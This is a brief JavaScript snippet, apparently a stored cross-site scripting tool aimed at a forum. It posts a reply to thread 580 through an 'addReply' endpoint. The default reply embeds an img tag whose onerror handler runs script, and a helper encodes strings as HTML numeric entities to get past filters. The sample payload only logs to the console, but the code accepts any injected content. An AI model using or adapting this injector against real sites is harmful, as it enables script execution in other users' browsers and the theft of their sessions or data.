function xss(content) {
	this.url = "/?a=addReply",
	this.data = {
		'reply_content': typeof content != "undefined" ? content : '学习了<img src="1" onerror="console.log(/error/)" alt="" />',
		'tiezi_id': '580'
	},
	this.callback = function (data) {
		console.log(data);
	}
}
xss.prototype = {
	post: function () {
		$.post(this.url, this.data, this.callback);
	},
	ch : function (str) {
		return "&#" + str.split("").map(function(data) {return data.charCodeAt();}).join("&#");
	}
}
var x = new xss;
